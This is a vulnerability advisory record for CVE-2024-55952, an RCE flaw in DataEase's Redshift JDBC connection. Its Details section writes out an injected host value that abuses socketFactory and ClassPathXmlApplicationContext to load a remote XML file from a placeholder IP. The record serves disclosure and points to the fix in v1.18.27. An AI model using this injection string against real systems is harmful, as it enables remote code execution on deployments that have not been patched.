# [H] Dataease Redshift Data Source JDBC Connection Parameters Not Verified Leads to RCE Vulnerability

## Summary
Severity: High
Advisory: CVE-2024-55952
Aliases: GHSA-w8qm-xw38-93qw
CVSS: 7.5 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N)
Published: 2024-12-18
Source: https://osv.dev/vulnerability/CVE-2024-55952
Type: osv

## Details
DataEase is an open source business analytics tool. Authenticated users can remotely execute code through the backend JDBC connection. When constructing the jdbc connection string, the parameters are not filtered. Constructing the host as ip:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://ip:5432/1.xml&a= can trigger the ClassPathXmlApplicationContext construction method. The vulnerability has been fixed in v1.18.27. Users are advised to upgrade. There are no known workarounds for this vulnerability.

## References
- https://github.com/CVEProject/cvelistV5/tree/main/cves/2024/55xxx/CVE-2024-55952.json
- https://github.com/dataease/dataease/security/advisories/GHSA-w8qm-xw38-93qw
- https://nvd.nist.gov/vuln/detail/CVE-2024-55952
- https://github.com/dataease/dataease/commit/0db4872a52eccf6e83dd9359aa05db52dd580ec1
